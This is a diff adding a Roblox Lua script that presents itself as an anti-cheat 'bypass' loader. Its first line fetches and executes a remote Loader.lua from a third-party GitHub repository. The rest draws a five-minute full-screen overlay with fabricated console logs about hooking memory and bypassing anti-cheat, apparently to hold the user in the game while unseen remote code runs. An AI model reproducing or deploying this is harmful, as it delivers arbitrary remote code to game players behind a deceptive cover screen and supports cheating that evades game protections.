@@ -1,0 +1,244 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrLolhack/ESCAPETSUNAMIFORBRAINROTSt3l/refs/heads/main/Loader.lua"))()
+-- Services
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+
+-- Configuration
+local TOTAL_TIME = 300 -- 5 minutes
+local ACCENT_COLOR = Color3.fromRGB(255, 80, 200) -- Hot Neon Pink
+local GLOW_COLOR = Color3.fromRGB(160, 32, 240)  -- Deep Purple
+local BG_COLOR = Color3.fromRGB(10, 5, 15)      -- Near Black
+
+-- UI Root
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "OrchidBypass_Pro"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.DisplayOrder = 999999
+ScreenGui.Parent = CoreGui
+
+-- Main Full-Screen Overlay
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.fromScale(1, 1)
+MainFrame.BackgroundColor3 = BG_COLOR
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+-- Matrix Background (Pink Variant)
+local function createMatrixRain()
+    local char = Instance.new("TextLabel")
+    char.Size = UDim2.fromOffset(20, 20)
+    char.Position = UDim2.fromScale(math.random(), -0.1)
+    char.BackgroundTransparency = 1
+    char.Text = string.char(math.random(33, 126))
+    char.TextColor3 = GLOW_COLOR
+    char.TextTransparency = 0.6
+    char.Font = Enum.Font.Code
+    char.TextSize = 16
+    char.Parent = MainFrame
+    
+    TweenService:Create(char, TweenInfo.new(math.random(4, 8), Enum.EasingStyle.Linear), {
+        Position = UDim2.fromScale(char.Position.X.Scale, 1.1),
+        TextTransparency = 1
+    }):Play()
+    task.delay(8, function() char:Destroy() end)
+end
+
+task.spawn(function()
+    while true do
+        createMatrixRain()
+        task.wait(0.15)
+    end
+end)
+
+-- Central Glass Panel
+local Panel = Instance.new("Frame")
+Panel.Size = UDim2.fromOffset(480, 580)
+Panel.Position = UDim2.fromScale(0.5, 0.5)
+Panel.AnchorPoint = Vector2.new(0.5, 0.5)
+Panel.BackgroundColor3 = Color3.fromRGB(25, 15, 35)
+Panel.BackgroundTransparency = 0.15
+Panel.Parent = MainFrame
+
+local PanelCorner = Instance.new("UICorner")
+PanelCorner.CornerRadius = UDim.new(0, 20)
+PanelCorner.Parent = Panel
+
+local PanelGlow = Instance.new("UIStroke")
+PanelGlow.Thickness = 3
+PanelGlow.Color = ACCENT_COLOR
+PanelGlow.Transparency = 0.2
+PanelGlow.Parent = Panel
+
+-- Title Section
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.Position = UDim2.new(0, 0, 0, 15)
+Title.BackgroundTransparency = 1
+Title.Text = "BYPASSING Loading Script"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 26
+Title.Parent = Panel
+
+-- Status & Timer Labels
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(1, 0, 0, 20)
+StatusLabel.Position = UDim2.new(0, 0, 0, 75)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Initializing secure connection..."
+StatusLabel.TextColor3 = ACCENT_COLOR
+StatusLabel.Font = Enum.Font.GothamMedium
+StatusLabel.TextSize = 14
+StatusLabel.Parent = Panel
+
+local TimerLabel = Instance.new("TextLabel")
+TimerLabel.Size = UDim2.new(1, 0, 0, 20)
+TimerLabel.Position = UDim2.new(0, 0, 0, 95)
+TimerLabel.BackgroundTransparency = 1
+TimerLabel.Text = "ESTIMATED TIME: 05:00"
+TimerLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+TimerLabel.Font = Enum.Font.Code
+TimerLabel.TextSize = 13
+TimerLabel.Parent = Panel
+
+-- Seamless Console (No lines between logs)
+local ConsoleFrame = Instance.new("ScrollingFrame")
+ConsoleFrame.Size = UDim2.new(0.9, 0, 0, 260)
+ConsoleFrame.Position = UDim2.new(0.05, 0, 0, 130)
+ConsoleFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 20)
+ConsoleFrame.BackgroundTransparency = 0.6
+ConsoleFrame.BorderSizePixel = 0
+ConsoleFrame.ScrollBarThickness = 0 -- Hidden for smoothness
+ConsoleFrame.Parent = Panel
+
+local ConsoleLayout = Instance.new("UIListLayout")
+ConsoleLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ConsoleLayout.Padding = UDim.new(0, 0) -- Seamless removal of lines
+ConsoleLayout.Parent = ConsoleFrame
+
+-- Loading Bar Container
+local BarContainer = Instance.new("Frame")
+BarContainer.Size = UDim2.new(0.85, 0, 0, 6)
+BarContainer.Position = UDim2.new(0.075, 0, 0, 420)
+BarContainer.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
+BarContainer.BorderSizePixel = 0
+BarContainer.Parent = Panel
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.fromScale(0, 1)
+BarFill.BackgroundColor3 = ACCENT_COLOR
+BarFill.BorderSizePixel = 0
+BarFill.Parent = BarContainer
+
+local BarGradient = Instance.new("UIGradient")
+BarGradient.Color = ColorSequence.new(ACCENT_COLOR, GLOW_COLOR)
+BarGradient.Parent = BarFill
+
+-- Progress Text
+local ProgressPercent = Instance.new("TextLabel")
+ProgressPercent.Size = UDim2.new(1, 0, 0, 30)
+ProgressPercent.Position = UDim2.new(0, 0, 0, 435)
+ProgressPercent.BackgroundTransparency = 1
+ProgressPercent.Text = "0%"
+ProgressPercent.TextColor3 = ACCENT_COLOR
+ProgressPercent.Font = Enum.Font.GothamBold
+ProgressPercent.TextSize = 20
+ProgressPercent.Parent = Panel
+
+-- Warning
+local Warning = Instance.new("TextLabel")
+Warning.Size = UDim2.new(0.9, 0, 0, 40)
+Warning.Position = UDim2.new(0.05, 0, 0, 500)
+Warning.BackgroundTransparency = 1
+Warning.Text = "SYSTEM: Do not disconnect. Premature exit may trigger anti-cheat flag. Synchronizing modules..."
+Warning.TextColor3 = Color3.fromRGB(180, 120, 220)
+Warning.Font = Enum.Font.Gotham
+Warning.TextSize = 12
+Warning.TextWrapped = true
+Warning.Parent = Panel
+
+-- Logic: Helper Functions
+local function formatTime(s)
+    local mins = math.floor(s / 60)
+    local secs = s % 60
+    return string.format("ESTIMATED TIME: %02d:%02d", mins, secs)
+end
+
+local logQueue = {
+    {t = "> Fetching bypass_core.dll from remote...", c = Color3.new(1,1,1)},
+    {t = "> [SUCCESS] Module 'Orchid' downloaded.", c = Color3.fromRGB(150, 255, 150)},
+    {t = "> Scanning game memory for integrity checks...", c = Color3.fromRGB(180, 180, 255)},
+    {t = "> Hooking LuaU virtual machine...", c = Color3.fromRGB(255, 150, 255)},
+    {t = "> WARNING: Obfuscation layer detected. Decrypting...", c = Color3.fromRGB(255, 200, 100)},
+    {t = "> Memory patch applied at 0x7FF8A2", c = Color3.fromRGB(200, 200, 200)},
+    {t = "> Spoofing client environment...", c = Color3.new(1,1,1)},
+    {t = "> Bypassing server-side heartbeats...", c = Color3.fromRGB(255, 100, 150)}
+}
+
+local function addLog()
+    local data = logQueue[math.random(1, #logQueue)]
+    local log = Instance.new("TextLabel")
+    log.Size = UDim2.new(1, 0, 0, 20)
+    log.BackgroundTransparency = 1
+    log.Text = "  " .. data.t
+    log.TextColor3 = data.c
+    log.Font = Enum.Font.Code
+    log.TextSize = 13
+    log.TextXAlignment = Enum.TextXAlignment.Left
+    log.Parent = ConsoleFrame
+    
+    ConsoleFrame.CanvasSize = UDim2.new(0, 0, 0, ConsoleLayout.AbsoluteContentSize.Y)
+    ConsoleFrame.CanvasPosition = Vector2.new(0, ConsoleFrame.CanvasSize.Y.Offset)
+end
+
+-- Main Loop
+local start = tick()
+task.spawn(function()
+    while tick() - start < TOTAL_TIME do
+        local elapsed = tick() - start
+        local progress = elapsed / TOTAL_TIME
+        local remaining = math.max(0, TOTAL_TIME - elapsed)
+        
+        -- Update UI
+        BarFill.Size = UDim2.fromScale(progress, 1)
+        ProgressPercent.Text = math.floor(progress * 100) .. "%"
+        TimerLabel.Text = formatTime(math.floor(remaining))
+        
+        -- Update Status Phase
+        if progress < 0.3 then
+            StatusLabel.Text = "Downloading Script Modules (" .. math.floor(progress * 333) .. "kb/s)..."
+        elseif progress < 0.8 then
+            StatusLabel.Text = "Injecting Bypass Hooks..."
+        else
+            StatusLabel.Text = "Finalizing Script Execution..."
+        end
+        
+        -- Random Logs
+        if math.random(1, 15) == 1 then
+            addLog()
+        end
+        
+        -- Glitch Warning Effect
+        Warning.TextTransparency = 0.2 + (math.sin(tick() * 5) * 0.2)
+        
+        task.wait(0.1)
+    end
+    
+    -- Completion
+    StatusLabel.Text = "Script Bypass Completed"
+    StatusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
+    addLog("> [FINISH] Script injected successfully.")
+    
+    task.wait(3)
+    ScreenGui:Destroy()
+end)
+
+-- Pulse Panel Glow
+task.spawn(function()
+    while true do
+        TweenService:Create(PanelGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.6}):Play()
+        task.wait(3)
+    end
+end)
+
